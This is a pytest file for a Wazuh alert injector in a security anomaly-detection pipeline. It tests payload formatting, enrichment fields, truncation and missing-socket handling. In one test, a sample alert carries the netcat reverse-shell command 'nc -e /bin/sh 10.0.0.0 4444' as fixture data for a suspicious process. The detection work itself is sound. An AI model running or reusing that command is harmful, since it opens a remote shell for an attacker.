"""Tests for the Wazuh socket injector against a real UNIX datagram socket."""

import json
import socket
from pathlib import Path

from src.injector import QUEUE_PREFIX, WazuhSocketInjector


def test_send_alert_delivers_formatted_payload(tmp_path: Path) -> None:
    socket_path = str(tmp_path / "queue")

    # Stand up a real UNIX datagram socket to act as the Wazuh manager.
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    try:
        injector = WazuhSocketInjector(socket_path)
        assert (
            injector.send_alert(
                "001",
                100100,
                0.873,
                "suspicious_proc",
                command="nc -e /bin/sh 10.0.0.0 4444",
                user="root",
                timestamp="2026-06-06T12:00:00+0000",
                agent_name="db-prod",
            )
            is True
        )

        raw = server.recv(65536).decode("utf-8")
        assert raw.startswith(QUEUE_PREFIX)

        body = json.loads(raw[len(QUEUE_PREFIX):])
        alert = body["anomaly_detector"]
        assert alert["agent_id"] == "001"
        assert alert["rule_id"] == 100100
        assert alert["process_name"] == "suspicious_proc"
        assert alert["anomaly_score"] == 0.873
        # Enrichment fields the triage layer relies on.
        assert alert["command"] == "nc -e /bin/sh 10.0.0.0 4444"
        assert alert["user"] == "root"
        assert alert["agent_name"] == "db-prod"
        assert alert["event_timestamp"] == "2026-06-06T12:00:00+0000"
    finally:
        server.close()


def test_send_alert_includes_severity_and_top_features(tmp_path: Path) -> None:
    socket_path = str(tmp_path / "queue")
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    try:
        injector = WazuhSocketInjector(socket_path)
        top_features = [
            {"feature": "command_entropy", "message": "command entropy above normal",
             "contribution_pct": 72.0},
        ]
        assert injector.send_alert(
            "001",
            100100,
            0.5,
            "proc",
            severity=426.18,
            top_features=top_features,
        )
        alert = json.loads(
            server.recv(65536).decode("utf-8")[len(QUEUE_PREFIX):]
        )["anomaly_detector"]
        assert alert["severity"] == 426.18
        assert alert["top_features"] == top_features
        # A flat summary string is derived for the dashboard/rule description.
        assert alert["explanation"] == "command entropy above normal"
    finally:
        server.close()


def test_send_alert_omits_explainability_fields_when_absent(tmp_path: Path) -> None:
    socket_path = str(tmp_path / "queue")
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    try:
        injector = WazuhSocketInjector(socket_path)
        injector.send_alert("001", 100100, 0.5, "proc")
        alert = json.loads(
            server.recv(65536).decode("utf-8")[len(QUEUE_PREFIX):]
        )["anomaly_detector"]
        assert "severity" not in alert
        assert "top_features" not in alert
    finally:
        server.close()


def test_send_alert_truncates_oversized_command(tmp_path: Path) -> None:
    from src.injector import MAX_COMMAND_LEN

    socket_path = str(tmp_path / "queue")
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    try:
        injector = WazuhSocketInjector(socket_path)
        injector.send_alert("001", 100100, 0.5, "proc", command="A" * 5000)
        body = json.loads(server.recv(65536).decode("utf-8")[len(QUEUE_PREFIX):])
        assert len(body["anomaly_detector"]["command"]) == MAX_COMMAND_LEN
    finally:
        server.close()


def test_send_alert_returns_false_when_socket_missing(tmp_path: Path) -> None:
    injector = WazuhSocketInjector(str(tmp_path / "does_not_exist"))
    assert injector.send_alert("001", 100100, 0.5, "proc") is False
